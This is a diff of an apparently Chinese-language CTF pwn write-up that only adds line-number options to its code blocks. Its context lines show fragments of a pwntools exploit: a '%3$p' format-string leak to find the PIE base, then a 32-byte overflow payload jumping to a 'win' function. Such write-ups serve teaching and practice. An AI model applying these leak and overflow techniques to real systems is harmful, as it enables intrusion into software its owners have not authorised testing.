@@ -16,7 +16,7 @@ authors: ['default']
 
 LINK
 
-```c:source.c
+```c:source.c showLineNumbers
 #include <stdio.h>
 
 void vuln() {
@@ -66,7 +66,7 @@ hello
 
 和上次一样，我们首先设置好一些基本内容。
 
-```python
+```python showLineNumbers
 from pwn import *
 
 context.log_level = 'debug'
@@ -119,7 +119,7 @@ LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
   对于没有开启 PIE 的程序，直接用 `checksec` 也可以看到基地址。
 </Tip>
 
-```python
+```python showLineNumbers
 p.recvuntil('name?\n')
 p.sendline('%3$p')
 
@@ -132,7 +132,7 @@ log.success(f'PIE base: {hex(elf.address)}')
 
 现在，我们只需要发送 payload 就可以了。
 
-```python
+```python showLineNumbers
 payload = b'A' * 32
 payload += p32(elf.sym['win'])
 
@@ -144,7 +144,7 @@ p.interactive()
 
 ### 1x03 最终 Exploit
 
-```python:exp.py
+```python:exp.py showLineNumbers
 from pwn import *
 
 context.log_level = 'debug'
